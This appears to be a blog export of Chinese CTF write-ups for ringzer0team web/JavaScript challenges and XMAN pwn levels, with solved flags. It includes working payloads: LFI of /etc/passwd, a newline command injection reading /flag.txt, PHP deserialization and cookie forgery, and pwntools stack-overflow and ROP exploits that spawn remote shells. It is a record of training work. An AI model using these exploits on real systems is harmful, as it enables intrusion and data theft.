      <content type="text"><![CDATA[ringzer0team-web Big Brother is watching题目地址： https://ringzer0team.com/challenges/212 题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦访问https://ringzer0team.com/robots.txt12User-agent: *Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/ 访问 https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/ 得到flag；1FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i Looking for password file题目地址：http://ringzer0team.com:1008/?page=lorem.php 读取password，猜测是passwd文件。访问：http://ringzer0team.com:1008/?page=/etc/passwd 得到flag:1FLAG-zH9g1934v774Y7Zx5s16t5ym8Z Area 51题目地址：https://ringzer0team.com/challenges/48 题目提示：Access to this area is restricted using some secure .htaccess .htaccess中可以限制各种请求。通过尝试后，抓包，改请求方式GET为PUT。得到flag：1FLAG-w4KRr557y626izv567758O52 Headache题目提示：Answer is closer than you think! head，所以我们抓包看头部。得到flag：1FLAG-365m4fU5p2DVEQbfrptDE5Ru] Words mean something?给了一段不知所云的文字。。不懂就抓包咯。抓包后在cookie处发现flag：0。修改后发包得到flag： flag:1FLAG-AnlAb6QxDpQvg1yn2bAhyOJw Admin Panel有一个登陆框，随便输点什么进去，抓包后发现一个302跳转，在跳转页面里有一个奇怪的东西，见下： 将方法改成GET请求，在尾部添加：?showflagforme=yesIwantafla。见下： 得到flag：1FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS Captcha I题目地址：http://captcha.ringzer0team.com:7421/form1.php测试一次后，题目提示说要验证一千次。查看源代码，可以发现如下js代码：1234567891011&lt;script&gt;function doIt()&#123; var A = document.getElementById('captcha-form').value; if (A == "ehage")&#123; document.forms["Form1"].submit(); &#125; else &#123; alert("BAD Captcha"); &#125;&#125;&lt;/script&gt; 其中if判断条件里的ehage就是当前的验证码，所以只要写脚本提取出这段字符串，然后再发包就行啦。脚本如下：123456789101112131415import requestscookie = &#123;'_ga':'GA1.2.1373385590.1498799275','_gid':'GA1.2.867459789.1498799275','_gat':'1','PHPSESSID':'1kr76vh1164sbgeflnngimi321'&#125;url = 'http://captcha.ringzer0team.com:7421'headers = &#123;'Authorization':'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='&#125;for i in range(1000): # get captacha r = requests.get("http://captcha.ringzer0team.com:7421/form1.php",cookies=cookie,headers=headers) start_addr = r.text.find('if (A == "') + len('if (A == "') end_addr = r.text.find('"',start_addr) captcha = r.text[start_addr:end_addr] print(i,":",captcha) k = requests.get("http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new",cookies=cookie,headers=headers) data = &#123;'captcha': captcha&#125; k = requests.post('http://captcha.ringzer0team.com:7421/captcha1.php',cookies=cookie,headers=headers,data=data) 跑完后得到flag：1Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot; Password reset有一个登陆框，需要用户名和密码，还有一个重置（reset）功能。题目提供了源码。如下：12345678910111213141516171819202122232425&lt;?phpif(isset($_POST['reset_username'])) &#123; srand(time()); $token = rand(1000000000000000,9999999999999999); $success = '&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...' $hSql-&gt;FastQuery('DELETE FROM chal_113 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR'])); $hSql-&gt;FastQuery('insert into chal_113 values (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600));&#125;if(URL_HANDLE::GetInstance()-&gt;get-&gt;k != null) &#123; $result = reset($hSql-&gt;FastQuery('SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()-&gt;get-&gt;k))); if($hSql-&gt;RowCount() != 0) &#123; if($result-&gt;expired_time &gt; time()) &#123; $success = '&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'; &#125; else &#123; $success = '&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'; &#125; &#125; else &#123; $success = '&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'; &#125;&#125;?&gt; 伪随机数问题，还有就是关于unix时间戳的知识。目标很明确要对admin重置密码，当点了reset后，会根据当前的time生成一个token并存放在数据库中，这个就是下文的k值。 注意图片中是：2017 06:39:41 -0400。记得计算上时差为4个小时。所以实际时间应该是2017-07-01 10:39:41。写一个php脚本，生成需要的16位的digit code。1234567&lt;?php$t = strtotime('2017-07-01 10:39:41');echo($t . "&lt;br&gt;");srand($t);$token = rand(1000000000000000,9999999999999999);echo $token;?&gt; 上面代码在win平台下无法生成16位的code，这个不知道为什么。。。我换到unix环境后生成的token为 32933381064794967。访问：1http://ringzer0team.com/challenges/113/?k=3293338106479496 得到hint：1Here&apos;s your new password: Thi%P@s50rD!sM1n3* 登陆，得到flag：1FLAG-DlwwTV7vCQf4Dn281Yhb802x5U PHP Fairy有一个登陆框。题目给了源码12345678910111213141516171819202122232425262728&lt;?php$output = "";if (isset($_GET['code'])) &#123; $content = file_get_contents(__FILE__); $content = preg_replace('/FLAG\-[0-9a-zA-Z_?!.,]+/i', 'FLAG-XXXXXXXXXXXXXXXXXXXXXXX', $content); echo '&lt;div class="code-highlight"&gt;'; highlight_string($content); echo '&lt;/div&gt;';&#125;if (isset($_GET['pass'])) &#123; if(!preg_match('/^[^\W_]+$/', $_GET['pass'])) &#123; $output = "Don't hack me please :("; &#125; else &#123; $pass = md5("admin1674227342"); if ((((((((($_GET['pass'] == $pass)))) &amp;&amp; (((($pass !== $_GET['pass']))))) || ((((($pass == $_GET['pass'])))) &amp;&amp; ((($_GET['pass'] !== $pass)))))))) &#123; // Trolling u lisp masta if (strlen($pass) == strlen($_GET['pass'])) &#123; $output = "&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125;&#125;?&gt; 考察php弱类型。经过md5加密后生成以0e开头的字符串，而以0e开头的字符串用==比较时会被转换成0 == 0即成立。而!== 不仅比较值，而且还会比较类型。所以我们只要传入pass的值为一个0e开头的值，并且长度为32位（$pass长度为32位），比如说：0e509367213418206700842008763514。 得到flag：1FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS Malicious upload 上传题，一般关注文件名后缀和content-type。经过fuzz：）知道，对filename，服务器端的检测时从左向右匹配.xxx，若遇到的第一个.xxx不是png则上传失败，另一个就是需要把content-type设置为image/png 得到flag：1FLAG-ve46i9UFtDh8Xd4hnqKRkP17 Security through obscurity!题目说：You don&#39;t have admin access.。一脸懵逼，抓包发现一个奇奇怪怪的cookie： 看着。。就很像base64加密；) 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode('Z3Vlc3QsZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LGZhbHNlOjIyOWQ3NDU5MmQ5MjNiOThlZjA3NjViNTU5OTkyZDI1')b'guest,e738b099a664e00e,1498908736,false:229d74592d923b98ef0765b559992d25' 后面那串感觉很像md5，解密无果。想想先尝试改改一些东西,，比如把guest改成admin，false改成true，base64加密后得到：1YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LHRydWU6MjI5ZDc0NTkyZDkyM2I5OGVmMDc2NWI1NTk5OTJkMjU= 所以基本可以断定后面那串是md5，发包后，提示之后我把原始的包，没有改过cookie的包直接fowward掉后提示说：1Expired cookie. 说明有时间限制，结合前面做过的题目推断1498908736是unix时间戳，它可以直接转换为2017/7/1 19:32:16。接下来，从整体上看一下这个cookie，它被冒号:分为两段。所以：1md5(&quot;guest,e738b099a664e00e,1498908736,false&quot;) =&gt; 229d74592d923b98ef0765b559992d25 不过，第二个值不清楚是如何生成的，也许只是个随机值。所以我们改一改，记得把unix时间戳改大一点不然会提示过期：123md5(&quot;admin,e738b099a664e00e,1498999999,true&quot;) =&gt; 05fda7a65b3ac89393e7de85bc8db295base64(&quot;admin,e738b099a664e00e,1498999999,true:05fda7a65b3ac89393e7de85bc8db295&quot;) =&gt; YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTk5OTk5LHRydWU6MDVmZGE3YTY1YjNhYzg5MzkzZTdkZTg1YmM4ZGIyOTU= 得到flag：1FLAG-Feg03OSzWhxO03K94108100f REST in peace题目提示：Your goal is to get superadmin access题目地址是：https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php直接访问会显示Access Denied。抓包后在响应包头部发现奇怪的东东，见下： 发现是sha512加密，简单咯： 将字符串admin经过sha512加密后，在请求包中添加Strong-Auth字段。发送后得到以下内容：1234Document title security levelThe secret of the universe.docx privateBe Better In Bed By Richard MacDonald.docx publicThis file may contain a flag or not.docx extremely private 然后，，然后我还没做出来。待续。 PHP feature or 0day?题目给了源码。123456789101112&lt;?phpini_set('error_displays', 0);$ip = htmlspecialchars($_GET['url'], ENT_QUOTES);$f = fsockopen($ip, 80, $errno, $errstr, 5);if($f) &#123; $result = shell_exec('ping -c 4 ' . $ip); echo '&lt;div class="alert alert-success"&gt;' . nl2br($result) . '&lt;/div&gt;';&#125; else &#123; echo '&lt;div class="alert alert-danger"&gt;' .$errstr . '&lt;/div&gt;';&#125;?&gt; %0a绕过即可。payload1:1127.0.0.1%0als / 发现有flag.txt。 payload2：1127.0.0.1%0acat /flag.txt 得到flag：1FLAG-v0195ZH325rG9m20043Blm92LeRE77aF Password reset reloaded题目提供了源码。伪随机数的问题，跟前面的reset passwd的题一样，点了reset后，会提示说：1Reset password link has been sent to admin@youdontownthisemailagain.com. Please follow the link http://ringzer0team.com/challenges/120/?k=[your 16 digits code] soon as possible your token expired in 1 hour. 所以为了得到16位digits code，需要得到randomDigit。为得到randomDigit，需要先得到seed。而seed由$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));生成。用如下php代码生成：12345678910111213&lt;?php $token = ""; $size = 32; $seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2)); srand($seed); for($i = 0; $i &lt; 16; $i++) &#123; $randomDigit = (string)rand() % 10; $token .= "," . $randomDigit; &#125; $token = str_replace(",", "", $token); echo $token;?&gt; 得到16位digit code为3675356291270936。访问：1https://ringzer0team.com/challenges/120/?k=3675356291270936 得到passwd：CrytoIsCool!1337。登陆得到flag：1FLAG-LPmaGkfnDHrsMoOyHA7nIjOPRy Serial killer!点进去时链接是：1https://ringzer0team.com/challenges/41/?o=TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjoxOntzOjY6ImFjdGlvbiI7czoxNDoiR2V0Q3VycmVudERhdGUiO319 后面跟的一串base64加密，解密后为：1&apos;O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;\x00RandomClass\x00uStruct&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;action&quot;;s:14:&quot;GetCurrentDate&quot;;&#125;&#125;&apos; 注意解密后里有\x00，是不可显示字符。从base64解密结果猜测为php反序列化问题。我们随便参数改改，传进去试试，结果得到报错： 格式化后源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041class RandomClass &#123; private static $instance; private $uStruct; public function __construct() &#123; $this-&gt;uStruct = (object)array(); &#125; public static function GetInstance() &#123; if(!isset(self::$instance)) &#123; self::$instance = new self(); &#125; return self::$instance; &#125; public function __set($key, $value) &#123; $this-&gt;uStruct-&gt;$key = $value; &#125; public function __get($key) &#123; return $this-&gt;uStruct-&gt;$key; &#125; public function DoAction() &#123; $action = $this-&gt;uStruct-&gt;action; $this-&gt;$action(); &#125; public function GetCurrentDate() &#123; GetCurrentDate($this-&gt;uStruct); &#125; public function ShowFlag() &#123; if($this-&gt;uStruct-&gt;time !== null &amp;&amp; $this-&gt;uStruct-&gt;flag == 'Please?') &#123; ShowFlag($this-&gt;uStruct); &#125; &#125; public function GetOutput() &#123; return $this-&gt;uStruct-&gt;output; &#125;&#125; 由源码知道，uStruct由(object)array()得到，我们需要设置uStruct的action指为’ShowFlag’，这样才会调用ShowFlag函数。设置uStruct的flag值为’Please?’，设置uStruct的time值不为空，才能正确打印出flag。用如下脚本构造：1234567891011121314&lt;?phpclass RandomClass &#123; private static $instance; private $uStruct; public function __construct() &#123; $this-&gt;uStruct = (object)array('action'=&gt;'ShowFlag','time' =&gt; '1','flag' =&gt; 'Please?'); &#125;&#125;$chybeta = new RandomClass();echo serialize($chybeta);?&gt; 得到：1O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;RandomClassuStruct&quot;;O:8:&quot;stdClass&quot;:3:&#123;s:6:&quot;action&quot;;s:8:&quot;ShowFlag&quot;;s:4:&quot;time&quot;;s:1:&quot;1&quot;;s:4:&quot;flag&quot;;s:7:&quot;Please?&quot;;&#125;&#125; 为能让服务器端正确解析，需要再加入两个不可见字符\x00，用python脚本如下:1234import base64# a = 'O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":1:&#123;s:6:"action";s:14:"GetCurrentDate";&#125;&#125;';a ='O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":3:&#123;s:6:"action";s:8:"ShowFlag";s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";&#125;&#125; 'print base64.b64encode(a) 得到：1TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjozOntzOjY6ImFjdGlvbiI7czo4OiJTaG93RmxhZyI7czo0OiJ0aW1lIjtzOjE6IjEiO3M6NDoiZmxhZyI7czo3OiJQbGVhc2U/Ijt9fSA= 抓包，替换参数，如下： 得到flag：1FLAG-Wz87W7Rv0nmK75Hmbq41qc2i Looking for the flag?可以用php://filter读到源码：1http://ringzer0team.com:1008/?page=php://filter/read=convert.base64-encode/resource=index.php 得到flag：1FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-js-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-js-writeup%2F</url>
      <content type="text"><![CDATA[未完待续..待续.. Client side validation is so secure? 查看源代码，发现下面的js123456789101112131415&lt;script&gt; // Look's like weak JavaScript auth script :) $(".c_submit").click(function(event) &#123; event.preventDefault() var u = $("#cuser").val(); var p = $("#cpass").val(); if(u == "admin" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125;);&lt;/script&gt; 用控制台运行一下得到密码为：12String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)&quot;JavaScriptIsSecure&quot; 填入账号admin，密码JavaScriptIsSecure，得到flag：1FLAG-66Jq5u688he0y46564481WRh Is hashing more secure?查看源代码，发现js：1234567891011$(".c_submit").click(function(event) &#123; event.preventDefault(); var p = $("#cpass").val(); if(Sha1.hash(p) == "b89356ff6151527e89c4f3e3d30c8e6586c63962") &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;&#125;); 工具网站：http://hashtoolkit.com得到密码为；adminz。填入，得到flag。1FLAG-bXNsYg9tLCaIX6h1UiQMmMYB Then obfuscation is more secure?1234&lt;script&gt; // Look's like weak JavaScript auth script :) var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var _0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );&lt;/script&gt; 拖到http://ddecode.com/解一下得到如下代码： 12345// Look's like weak JavaScript auth script :)var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(_0xc360[12])[_0xc360[11]](function() &#123; var _0xf382x1 = $(_0xc360[1])[_0xc360[0]](); var _0xf382x2 = _0xc360[2]; if (_0xf382x1 == _0xc360[3] + _0xf382x2) &#123; if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) &#123; document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1; &#125;; &#125; else &#123; $(_0xc360[10])[_0xc360[9]](_0xc360[8]); &#125;;&#125;); 自己再替换一下。总算能看了。 12345678910111213var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(".c_submit")["click"](function() &#123; var _0xf382x1 = $("#cpass")["val"](); var _0xf382x2 = "alk3"; if (_0xf382x1 == "02l1" + _0xf382x2) &#123; if (document["location"]["href"]["indexOf"]("?p=",) == -1) &#123; document["location"] = document["location"]["href"] + "?p=", + _0xf382x1; &#125;; &#125; else &#123; $("#cresponse")["html"]("&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;;&#125;); 所以密码是 02l1alk3，得到flag：1FLAG-5PJne3T8d73UGv4SCqN44DXj Why not?12345678910111213141516171819202122232425$(".c_submit").click(function(event) &#123; event.preventDefault(); var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = $("#cuser").val(); var p = $("#cpass").val(); var t = true; if(u == "administrator") &#123; for(i = 0; i &lt; u.length; i++) &#123; if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; break; &#125; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125;&#125;); 写一个js脚本。123456789&lt;script&gt; var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = "administrator"; var p = ""; for (i = 0; i &lt; u.length; i++)&#123; p += String.fromCharCode(k[i] - i * 10 - u.charCodeAt(i) ); &#125; alert(p);&lt;/script&gt; 弹框得到结果：OhLord4309111，得到flag：1FLAG-65t23674o6N2NehA44272G24 Valid key required1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;script&gt; function curry( orig_func ) &#123; var ap = Array.prototype, args = arguments; function fn() &#123; ap.push.apply( fn.args, arguments ); return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args ); &#125; return function() &#123; fn.args = ap.slice.call( args, 1 ); return fn.apply( this, arguments ); &#125;; &#125; function callback(x,y,i,a) &#123; return !y.call(x, a[a["length"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;; &#125; var ref = &#123;T : "BG8",J : "jep",j : "M2L",K : "L23",H : "r1A"&#125;; function validatekey() &#123; e = false; var _strKey = ""; try &#123; _strKey = document.getElementById("key").value; var a = _strKey.split("-"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + _strKey; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125; function equal(o,o1) &#123; var keys1 = Object.keys(o1); var keys = Object.keys(o); if(keys1.length != keys.length) return false; for(var i=0;i&lt;keys.length;i++) if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]]) return false; return true; &#125; function hook(f1,f2,f3) &#123; return function(x) &#123; return f2(f1(x),f3(x));&#125;; &#125; var h = curry(hook); var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function("a","b","return a &amp;&amp; b;")); function genFunc(_part) &#123; if(!_part || !(_part.length) || _part.length !== 4) return function() &#123;&#125;; return new Function(_part.substring(1,3), "this." + _part[3] + "=" + _part.slice(1,3) + "+" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : "'"+ _part[0] + "'")); &#125;&lt;/script&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN-pwn-writeup]]></title>
      <url>%2F2017%2F06%2F29%2FXMAN-pwn-writeup%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路 level 0 x64分析main函数： vuln函数: 用strings可以看到，有/bin/sh，这样我们不用再去写入了。 exp12345678910111213141516from pwn import *p = remote("pwn2.jarvisoj.com",9881)elf = ELF("./level0")offset = 0x80 + 8system_addr = elf.symbols['system']sh_addr = next(elf.search('/bin/sh'))pop_rdi_ret_addr = 0x0000000000400663payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/0$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done[*] &apos;/home/chybeta/pwn/ctf/xman/0/level0&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeHello, World$ lsflaglevel0_x64$ cat flagCTF&#123;713ca3944e92180e0ef03171981dcd41&#125; level 1分析main函数； vulnerable_function函数： 很明显的栈溢出漏洞。溢出点用pattern查出为140个字节。用checksec看后发现NX没有开启，可以插入shellcode。题目也给出了buf的地址。因此可以在buf数组中插入shellcode，然后再溢出跳转到buf的起始位置去执行shellcode。 exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9877)# p = process("./level1")elf = ELF("./level1")p.recvuntil("What's this:")buf_addr = p.recvuntil("?")[:-1]buf_addr = int(buf_addr,16)offset = 140shellcode = asm(shellcraft.sh())payload = shellcodepayload = payload.ljust(140,'a')payload += p32(buf_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/xman1$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done[*] &apos;/home/chybeta/pwn/ctf/xman/xman1/level1&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE[*] Switching to interactive mode$$ lsflaglevel1$ cat flagCTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125; level 2分析main函数 vulnerable_function函数： 这题用strings查看时，会发现有/bin/sh字符串，不需要我们再去写入了。用gdb去调试，没成功，栈被重置了。不过从vuln函数里可以很清楚的看到，它先调用了一次system，而且read中存在栈溢出漏洞。而且buf的地址在bp-88h的位置。从内存的分布知道，当前栈帧的ebp再减去4个字节就是return的地址。所以溢出的offset同样是 0x88 + 4。所以这题的思路就是，覆盖返回地址，跳转到system，构造栈上的参数，给system传入sh/。 exp1234567891011121314from pwn import *p = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")offset = 0x88 + 4sh_addr = next(elf.search('/bin/sh'))payload = 'a' * offsetpayload += p32(elf.symbols['system'])payload += p32(1) #paddingpayload += p32(sh_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/2$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2/level2&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2$ cat flagCTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;$ level 2 x64分析换成64位版本，参数要用rdi传递。binary中有sh字符串，直接利用就可以。这题似乎跟level0差不多啊。。 exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9882)# p = process("./level2_x64")elf = ELF("./level2_x64")offset = 0x80 + 8pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1system_plt = elf.plt['system']sh_addr = next(elf.search("/bin/sh"))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_plt)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/2x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9882: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2x64/level2_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2_x64$ cat flagCTF&#123;081ecc7c8d658409eb43358dcc1cf446&#125; level 3分析main函数跟前面一样。 vuln函数: 仍然是栈溢出。题目给了libc.so，这样我们就有偏移。利用write泄露出read的地址后计算出system和sh的地址，之后直接调用即可。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p = remote("pwn2.jarvisoj.com",9879)elf = ELF("./level3")libc = ELF("./libc-2.19.so")p.recvuntil("Input:\n")offset = 0x88 + 4read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search("/bin/sh"))read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']payload = 'a' * offsetpayload += p32(write_plt)payload += p32(vuln_addr)payload += p32(1)payload += p32(read_got)payload += p32(4)p.sendline(payload)read_addr = u32(p.recv(4))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(sh_addr)p.sendline(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3/level3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3/libc-2.19.so&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] system address =&gt; 0xf763a310[+] sh address =&gt; 0xf775a84c[*] Switching to interactive mode$ lsflaglevel3$ cat flagCTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;$ exp（无libc版本）假设题目没有给libc的话，可以用下面这个exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *#p = process("./level3")p = remote("pwn2.jarvisoj.com",9879)# p = remote("127.0.0.1",12345)elf = ELF("./level3")pop3addr = 0x08048519offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']start_addr = elf.symbols['_start']main_addr = elf.symbols['main']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.sendline(payload) address = p.recv(4) return addressd = DynELF(leak, elf=ELF("./level3"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(100)# payload +=payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.sendline(payload)p.sendline(sh)p.interactive() 这个exp几乎和level4的相同，所以具体的一些坑就见下面吧。 level 3 x64分析函数啥的，跟前面的level3一样。参数用rdi，rsi等寄存器优先传递。构造rop链。 exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *p = remote("pwn2.jarvisoj.com",9883)elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")offset = 0x80 + 8read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1read_system_offset = libc.symbols['read'] - 